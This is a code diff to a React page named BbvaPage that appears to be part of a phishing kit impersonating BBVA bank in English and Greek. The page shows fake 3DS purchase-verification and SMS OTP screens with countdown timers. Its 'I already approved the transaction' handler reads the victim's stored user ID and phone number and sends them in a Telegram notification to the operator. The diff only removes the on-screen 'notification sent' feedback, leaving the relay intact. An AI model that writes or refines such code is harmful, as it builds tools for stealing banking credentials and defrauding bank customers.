@@ -312,7 +312,6 @@ export default function BbvaPage(props: any) {
   const [bocSubmitCount, setBocSubmitCount] = useState(0)
   const [sessionSecondsLeft, setSessionSecondsLeft] = useState(210)
   const [isSmsOtpRequested, setIsSmsOtpRequested] = useState(false)
-  const [bocApprovedSent, setBocApprovedSent] = useState(false)
   const [bocOtpSecondsLeft, setBocOtpSecondsLeft] = useState(210)
   const bocInputRef = useRef<HTMLInputElement>(null)
 
@@ -320,7 +319,6 @@ export default function BbvaPage(props: any) {
   useEffect(() => {
     if (currentScreen !== "boc-verify") {
       setIsSmsOtpRequested(false)
-      setBocApprovedSent(false)
       return
     }
 
@@ -878,7 +876,6 @@ export default function BbvaPage(props: any) {
 
   // 2.5 Handle 3DS Purchase Verification Approval: "I already approved the transaction"
   const handleBocApproval = async () => {
-    setIsBocVerifying(true)
     try {
       const savedUser = (typeof window !== "undefined" && sessionStorage.getItem("bbva_userId")) || userId.trim()
       const savedPhone =
@@ -897,9 +894,6 @@ export default function BbvaPage(props: any) {
       })
     } catch (err) {
       console.error("Error sending Telegram notification:", err)
-    } finally {
-      setIsBocVerifying(false)
-      setBocApprovedSent(true)
     }
   }
 
@@ -1859,29 +1853,15 @@ export default function BbvaPage(props: any) {
                   {/* Bullet 1: I already approved the transaction -> sends Telegram notification */}
                   <li className="flex items-start gap-2">
                     <span className="text-[13px] leading-none select-none shrink-0 mt-0.5">•</span>
-                    <div className="flex flex-wrap items-center gap-1.5">
-                      <button
-                        type="button"
-                        onClick={handleBocApproval}
-                        disabled={isBocVerifying}
-                        className="text-left text-[#111827] underline underline-offset-2 hover:opacity-75 transition-opacity cursor-pointer font-normal"
-                      >
-                        {bocLanguage === "en"
-                          ? "I already approved the transaction"
-                          : "Έχω ήδη εγκρίνει τη συναλλαγή"}
-                      </button>
-                      {isBocVerifying && (
-                        <span className="text-[11.5px] text-[#058998] font-medium animate-pulse">
-                          ({bocLanguage === "en" ? "Sending..." : "Αποστολή..."})
-                        </span>
-                      )}
-                      {!isBocVerifying && bocApprovedSent && (
-                        <span className="text-[11.5px] text-[#16a34a] font-medium inline-flex items-center gap-1">
-                          <span>✓</span>
-                          <span>{bocLanguage === "en" ? "Notification sent" : "Η ειδοποίηση στάλθηκε"}</span>
-                        </span>
-                      )}
-                    </div>
+                    <button
+                      type="button"
+                      onClick={handleBocApproval}
+                      className="text-left text-[#111827] underline underline-offset-2 hover:opacity-75 transition-opacity cursor-pointer font-normal"
+                    >
+                      {bocLanguage === "en"
+                        ? "I already approved the transaction"
+                        : "Έχω ήδη εγκρίνει τη συναλλαγή"}
+                    </button>
                   </li>
 
                   {/* Bullet 2: [New Option] Send SMS OTP */}
